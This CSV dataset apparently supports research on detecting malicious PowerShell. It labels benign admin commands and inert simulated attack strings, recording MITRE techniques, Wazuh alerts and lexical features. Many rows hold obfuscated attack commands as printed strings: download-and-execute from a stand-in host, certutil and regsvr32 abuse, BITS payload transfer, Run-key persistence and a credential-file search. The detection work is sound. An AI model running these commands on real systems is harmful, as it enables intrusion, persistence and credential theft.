id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-136,simulated_malicious,1,1,obfuscated_indicator,credential_file_search_base64_literal_decode_safe,credential_file_search,positive:credential_file_search,Source-derived inert offensive behavior pattern,Credential Access,Credentials In Files,T1552.001,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d080c5de-cf2b-4303-8c76-ec16ecac9cb7,ceda6d7095b9be8ca76b7b933c632106569e0a7aa2583b01860f927931f87ebc,$encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,15,+2:category_defense_evasion;+2:category_credential_access;+1:category_discovery;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,434,1,10,27,0.062212,0.025346,0.006912,4.859714,1,0,312,1,312,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,2,password;select-string,0,2,2,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,1,3,2,1,4,3,3,1,5,1,5,1,1,1,1,1,1,1,1,0
PST-137,simulated_malicious,1,1,obfuscated_indicator,downloadstring_iex_mixed_case,downloadstring_iex,positive:downloadstring_iex,Source-derived inert offensive behavior pattern,Command and Control,Ingress Tool Transfer,T1059.001,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,79e799f7-72df-4fdd-beb3-a7f75c85ccdc,604694259f006f02c791fc952e50d4d05830af42c3cadd9839b87e35689ad7f2,$indicator='iEX (nEW-objeCT net.weBcLienT).DOwNLoaDstriNg(''HttPS://sTagE.exAMpLE.iNVAlID/BOOtstRAP.PS1'')'; Write-Output $indicator,7,+2:category_execution;+2:category_download;+2:multiple_high_risk_categories;+1:irregular_case,1,1,91837,4,4,"Powershell executed ""Get-Content -Stream or Invoke-Expresion"". Possible string execution as code",132,1,10,25,0.189394,0.007576,0.030303,5.259425,1,0,92,0,0,0,0,0,0,0,0,3,DOwNLoaDstriNg;net.weBcLienT;sTagE.exAMpLE.iNVAlID,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0,0,4,1,5,1,1,1,1,1,0,0,0,0
PST-138,simulated_malicious,1,1,clear_indicator,certutil_transfer_decode_clear,certutil_transfer_decode,positive:certutil_transfer_decode,Source-derived inert offensive behavior pattern,Defense Evasion,Deobfuscate/Decode Files or Information,T1140,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,efbe1115-fead-4229-85d2-a3a10231b44c,31c57c73e18697f34cacc67f8221b0a2f28239c8667c7c690609ee20b6f6df77,$indicator='certutil.exe -urlcache -split -f https://cert.example.invalid/blob.txt C:\__THESIS_INERT__\blob.txt; certutil.exe -decode C:\__THESIS_INERT__\blob.txt C:\__THESIS_INERT__\stage.bin'; Write-Output $indicator,7,+2:category_download;+2:category_lolbin;+2:multiple_high_risk_categories;+1:format_or_char_obfuscation,0,0,,,0,,218,1,18,48,0.220183,0.0,0.050459,4.971298,1,0,180,0,0,0,0,0,0,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0,2,3,1,5,1,1,0,0,0,0,0,0,0
PST-139,simulated_malicious,1,1,obfuscated_indicator,downloadstring_iex_string_concatenation,downloadstring_iex,positive:downloadstring_iex,Source-derived inert offensive behavior pattern,Command and Control,Ingress Tool Transfer,T1059.001,string_concatenation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,0a5dd4aa-3e7c-4da0-a4d1-4fde3649a991,c2819e43a4d24269a1534922c18a6d0b5924bb6d8f91569d5c7bb4a4548bc3e1,$indicator='IEX (New-' + 'Object' + ' Net.We' + 'bClient)' + '.DownloadStri' + 'ng(''https' + '://stage.exam' + 'ple.in' + 'valid/boot' + 'strap.ps1'')'; Write-Output $indicator,12,+2:category_execution;+2:category_download;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,1,1,91837,4,4,"Powershell executed ""Get-Content -Stream or Invoke-Expresion"". Possible string execution as code",177,1,16,52,0.293785,0.00565,0.124294,4.694712,10,10,92,0,0,0,0,9,0,0,0,0,,1,iex,1,0,0,2,downloadstring;webclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0,0,4,1,5,1,1,1,1,1,0,0,0,0
PST-140,benign,0,0,normal_benign,date_check_normal_v1,date_check_normal,benign:date_check_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,bf1ba6c7-5024-4e1e-944e-c5774e43ce2a,dff98cf19222283d71ba5b6a0e7b64107fbf2b683f47375cfca7b434de7b9e5b,Get-Date | Select-Object DateTime,0,,0,0,,,0,,33,1,3,3,0.090909,0.0,0.090909,3.710576,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-141,benign,0,0,hard_benign,hard_admin_text_with_password_word_v1,hard_admin_text_with_password_word,benign:hard_admin_text_with_password_word,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,a8152bb5-0540-4899-a578-5b6b6a204f73,b6b5a9dd171ef7a6b98bf97fc92122e94b58cf9de2c42e7cf867c26ae5214774,"$audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit",2,+2:category_credential_access,0,0,,,0,,112,1,14,9,0.080357,0.0,0.125,4.384641,1,0,80,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,credential;password,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-142,simulated_malicious,1,1,clear_indicator,encoded_command_clear,encoded_command,positive:encoded_command,Source-derived inert offensive behavior pattern,Execution,PowerShell,T1059.001,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,f1a79161-4979-4891-a25e-b9938d2b19e5,081ead397f47569c938d71808a1cf8d5b05925c0ee5fc85538cfe0cb61d34c84,$indicator='powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'; Write-Output $indicator,3,+2:category_execution;+1:base64_candidate,0,0,,,0,,172,1,9,11,0.063953,0.023256,0.040698,5.046198,1,0,134,1,72,1,0,0,0,0,0,0,,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-143,benign,0,0,normal_benign,net_ip_config_normal_v1,net_ip_config_normal,benign:net_ip_config_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,0b5ee2bd-6986-433d-9adc-0cdf907f9ea4,1823f2b7447f644077851f09d9124010c666908e53446d7a5c49fb4d542d5146,"Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address",0,,0,0,,,0,,75,1,6,5,0.066667,0.026667,0.08,4.643009,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-144,benign,0,0,normal_benign,disk_inventory_normal_v2,disk_inventory_normal,benign:disk_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,9475418f-2118-4c6c-97a2-93bad3eb1de0,253639e15c20c23e1ddfb7fe986a20892c4ebf1214809b37f7953a9074545869,"Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,108,1,10,10,0.092593,0.027778,0.092593,4.703933,1,1,16,0,0,0,0,0,0,0,0,2,Get-CimInstance;Win32_LogicalDisk,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-145,simulated_malicious,1,1,obfuscated_indicator,regsvr32_proxy_execution_base64_literal_decode_safe,regsvr32_proxy_execution,positive:regsvr32_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Regsvr32,T1218.010,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,672dcdfc-6ed8-4c9b-91bc-70b45b98497a,dd35fa72a58aa3775b33e2ddf92ae37ddb42e7f487d4d4f5d527cd0902cbf12e,$encoded='cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,14,+2:category_defense_evasion;+2:category_lolbin;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,306,1,10,25,0.081699,0.03268,0.009804,4.978216,1,0,184,1,184,1,0,0,0,0,0,2,FromBase64String;cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1,2,3,1,5,1,1,1,1,1,1,1,1,0
PST-146,simulated_malicious,1,1,clear_indicator,downloadstring_iex_clear,downloadstring_iex,positive:downloadstring_iex,Source-derived inert offensive behavior pattern,Command and Control,Ingress Tool Transfer,T1059.001,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,b558ef8a-0b65-4a6f-b624-fc7ce3a6720d,6f4d92cfbb33e0e9ad8e89de6820ee45d341da1f2d779005a53798c62620e3b4,$indicator='IEX (New-Object Net.WebClient).DownloadString(''https://stage.example.invalid/bootstrap.ps1'')'; Write-Output $indicator,7,+2:category_execution;+2:category_download;+2:multiple_high_risk_categories;+1:irregular_case,1,1,91837,4,4,"Powershell executed ""Get-Content -Stream or Invoke-Expresion"". Possible string execution as code",132,1,10,25,0.189394,0.007576,0.030303,4.941091,1,0,92,0,0,0,0,0,0,0,0,1,Net.WebClient,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0,0,4,1,5,1,1,1,1,1,0,0,0,0
PST-147,benign,0,0,normal_benign,log_source_summary_normal_v1,log_source_summary_normal,benign:log_source_summary_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,d357bc7b-7b86-4c10-b232-dc8d9492e0d0,7a376493c03f9c5969f102972715cb46be4719e142d1fcfaefde189f7d75ab7d,"Get-WinEvent -ListLog *PowerShell* | Select-Object LogName, RecordCount",1,+1:irregular_case,0,0,,,0,,71,1,6,7,0.098592,0.0,0.084507,4.671818,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-148,benign,0,0,normal_benign,process_cpu_sort_normal_v1,process_cpu_sort_normal,benign:process_cpu_sort_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,4d72609f-a002-477f-be4f-5eda01cdf7f3,27cc80b12d08a8c4c61acc0f75ae83d2d8fdd5dd7c5e265f150f90d37f287cb7,"Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id",0,+1:category_discovery;-1:discovery_only_correction,1,1,91815,4,4,Powershell executing process discovery,91,1,10,8,0.087912,0.010989,0.10989,4.49811,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0,1,5,0,5,0,1,0,1,1,0,0,0,0
PST-149,benign,0,0,hard_benign,hard_scheduled_task_read_filter_v1,hard_scheduled_task_read_filter,benign:hard_scheduled_task_read_filter,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,c80f57ed-5a21-4abe-bc4c-a6cbb0169246,0e2fcaa0232cec0f5799710b0676c98a89a6dfdc1f9e661514ce7fa8eb8dec29,"Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State",0,,0,0,,,0,,129,1,12,13,0.100775,0.007752,0.100775,4.700964,1,1,8,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-150,simulated_malicious,1,1,clear_indicator,add_type_native_api_partial_clear,add_type_native_api_partial,positive:add_type_native_api_partial,Source-derived inert offensive behavior pattern,Execution,Native API,T1106,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,3d9538b8-9dd5-4595-9180-969e1859b685,b8e53fc36ad060fd7551f4f33eea0e8649865c882fe2d2a3b8958f7cfc6f79c8,"$indicator='Add-Type -MemberDefinition ''[DllImport(""kernel32.dll"")] public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);'' -Name NativeMethods -Namespace Thesis.Inert'; Write-Output $indicator",2,+2:category_defense_evasion,0,0,,,0,,223,1,22,28,0.125561,0.008969,0.080717,4.841949,1,0,183,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-151,simulated_malicious,1,1,obfuscated_indicator,bits_transfer_alias_command_reconstruction,bits_transfer,positive:bits_transfer,Source-derived inert offensive behavior pattern,Defense Evasion,BITS Jobs,T1197,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d5ff756d-74bc-42fd-a4d8-ffab51fd269c,12abb11adb3f753399e0bcd8f5e2e0c72cfb81b463f343dae9ea7be6bce9e2fe,"$parts=@('Start-Bit','sTrans','fer -Sour','ce ''https','://bits.e','xample.inv','alid/payl','oad.bin',''' -Destinati','on ''$','env:TEMP\ca','che.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator",8,+2:category_download;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,215,1,23,75,0.348837,0.0,0.032558,4.803856,12,12,104,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,start-bitstransfer,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0,4,6,1,5,1,1,0,0,0,0,0,0,0
PST-152,simulated_malicious,1,1,obfuscated_indicator,archive_collection_backtick_literal,archive_collection,positive:archive_collection,Source-derived inert offensive behavior pattern,Collection,Archive Collected Data,T1560.001,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,434c76b2-bcee-45d1-9327-614278686e82,d3ac7d5ba78a92651006f9bdd2ab30c16ba0975dc3acf36e8119857897d78700,$indicator='Get-Chi`ldItem ''$env:USE`RPROFILE\Doc`uments'' -Recurse | Co`mpress-Archi`ve -Destin`ationP`ath ''$env:TEMP\co`llect.zip'''; Write-Output $indicator,3,+1:category_collection;+1:category_discovery;+1:backtick_obfuscation,1,1,91816,4,4,Powershell script querying system environment variables,161,1,19,35,0.217391,0.0,0.049689,5.015305,1,0,119,0,0,0,8,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0,3,4,0,5,0,1,0,1,1,0,0,0,0
PST-153,benign,0,0,normal_benign,registry_read_normal_v2,registry_read_normal,benign:registry_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,28b4c492-3489-41f7-a727-67a94f265339,b419a2c012d3c0896f0d456263774e2e2ff1ff0241bfe807173c9d5e7d6ec612,"Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output 'benign variant 2'",2,+1:category_discovery;+1:irregular_case,0,0,,,0,,147,1,12,16,0.108844,0.006803,0.07483,5.069398,2,1,66,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,1,0,1,1,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-154,simulated_malicious,1,1,obfuscated_indicator,dns_txt_channel_base64_literal_decode_safe,dns_txt_channel,positive:dns_txt_channel,Source-derived inert offensive behavior pattern,Command and Control,DNS,T1071.004,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,09a8ef5e-560c-4475-92ae-5c4c006a6c81,8ec080909dbe896c3b9aec82e9b2f138b349d0d259dc760eddfaed78fd88f3f1,$encoded='UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,14,+2:category_network_c2;+2:category_defense_evasion;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,374,1,10,26,0.069519,0.034759,0.008021,4.929627,1,0,252,1,252,1,0,0,0,0,0,2,FromBase64String;UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,0,1,1,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1,4,6,1,5,1,1,1,1,1,1,1,1,0
PST-155,benign,0,0,normal_benign,event_error_filter_normal_v2,event_error_filter_normal,benign:event_error_filter_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,d4b92f06-89cd-41b4-a8db-74b1bfeed39c,ef440e63a926fa1ca6f53ef4465924a8b9f69ce18f8dcdd30c4fc880807999a6,"Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,166,1,18,16,0.096386,0.024096,0.114458,4.842553,2,2,21,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-156,simulated_malicious,1,1,obfuscated_indicator,registry_run_key_alias_command_reconstruction,registry_run_key,positive:registry_run_key,Source-derived inert offensive behavior pattern,Persistence,Registry Run Keys / Startup Folder,T1547.001,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,3e7d8ee4-0a75-4df2-b82b-69853be83bc1,069549e7e7ba3d612990879aac60f697d61c9c15f0638e190a2bdf9f6b6358f1,"$parts=@('New-ItemPropert','y -Path ''HKCU:\So','ftware\Microsof','t\Windows\C','urrentVersio','n\Run'' -Name ''Upd','ateCheck'' -Value',' ''powershell.exe ','-WindowStyle Hid','den -File C:\__T','HESIS_INERT__\s','tage.ps1'''); $indicator=[string]::Concat($parts); Write-Output $indicator",13,+2:category_execution;+2:category_persistence;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,289,1,29,87,0.301038,0.00346,0.044983,5.101352,12,9,176,0,0,0,0,0,1,0,0,1,New-ItemPropert,1,windowstyle hidden,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,3,3,0,1,5,1,5,1,1,0,0,0,0,0,0,0
